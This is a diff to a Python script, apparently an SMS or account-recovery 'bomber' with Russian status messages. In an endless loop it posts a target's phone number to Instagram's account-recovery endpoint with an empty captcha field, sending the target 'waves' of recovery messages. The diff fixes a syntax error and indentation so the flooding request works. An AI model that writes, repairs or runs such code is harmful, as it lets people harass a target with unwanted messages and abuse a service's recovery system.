@@ -143,14 +143,13 @@ while True:
 	except:
 		print('\033[F[-] Не отправлено!')
 
-    try:
-		requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': _phone, 'recaptcha_challenge_field'=''})
+	try:
+		requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': _phone, 'recaptcha_challenge_field':''})
 		print('\033[F[+] Insta отправлено!           ')
 	except:
 		print('\033[F[-] Не отправлено!')
 
 	try:
 		iteration += 1
-		print(('\033[F{}  Волна пройдена.           ').format(iteration))
 	except:
 		break
